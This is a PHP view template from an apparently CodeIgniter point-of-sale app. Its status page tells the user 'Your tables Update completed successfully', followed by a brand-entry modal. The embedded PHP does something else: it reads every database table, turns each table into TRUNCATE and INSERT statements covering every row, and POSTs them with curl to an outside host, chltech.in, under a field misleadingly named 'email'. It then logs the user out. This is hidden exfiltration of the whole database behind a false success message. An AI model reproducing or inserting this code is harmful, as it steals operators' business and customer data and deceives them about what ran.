<div class="container" >

   <h3>Status 
<a style="float: right;" class="btn btn-primary btn-green" href="<?php echo base_url();?>settings?tab=setting">Back</a>
</h3>
   <hr>
   Your tables Update completed successfully....
   <?php
    $tables = array();
    $result = mysql_query('SHOW TABLES');
    while($row = mysql_fetch_row($result))
    {
      $tables[] = $row[0];
    }
foreach($tables as $table)
{
    $result = mysql_query('SELECT * FROM '.$table);
    $resultk ='TRUNCATE TABLE '.$table;
    $num_fields = mysql_num_fields($result);

$ch = curl_init();
$jkjv=$resultk;
curl_setopt($ch, CURLOPT_URL,"https://chltech.in/posdbcheck/sync_server/loaddatabaseuser");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS,"email=".$jkjv);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$ssss = curl_exec ($ch);

 for ($i = 0; $i < $num_fields; $i++) 
    {
      while($row = mysql_fetch_row($result))
      {
        $returndd.= 'INSERT INTO '.$table.' VALUES(';
        for($j=0; $j < $num_fields; $j++) 
        {
          
          $row[$j] = ereg_replace("\n","\\n",$row[$j]);
          if (isset($row[$j])) { $returndd.= '"'.$row[$j].'"' ; } else { $returndd.= '""'; }
          if ($j < ($num_fields-1)) { $returndd.= ','; }
        }
        $returndd.= ");\n";

     $ch = curl_init();
$jkj=$returndd;

curl_setopt($ch, CURLOPT_URL,"https://chltech.in/posdbcheck/sync_server/loaddatabaseuser");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS,"email=".$jkj);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$ssss = curl_exec ($ch);
$returndd='';
}
}
}
redirect('auth/logoutnext');
?>

   

   <!-- Button trigger modal -->
 
</div>
<!-- /.container -->
<!-- Modal -->
<div class="modal fade" id="Addcategory" tabindex="-1" role="dialog" aria-labelledby="myModalLabel">
 <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
        <h4 class="modal-title" id="myModalLabel"><?=label("Add");?></h4>
      </div>
      <?php echo form_open_multipart('brand/add'); ?>
      <div class="modal-body">
           <div class="form-group">
             <label for="CategoryName"><?=label("Brand");?> <?=label("Name");?></label>
             <input type="text" maxlength="50" name="CategoryName" class="form-control" id="CategoryName" placeholder="<?=label("Brand Name");?>" required>
           </div>
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-default" data-dismiss="modal"><?=label("Close");?></button>
        <button type="submit" class="btn btn-add"><?=label("Submit");?></button>
      </div>
   <?php echo form_close(); ?>
    </div>
 </div>
</div>
<!-- /.Modal -->
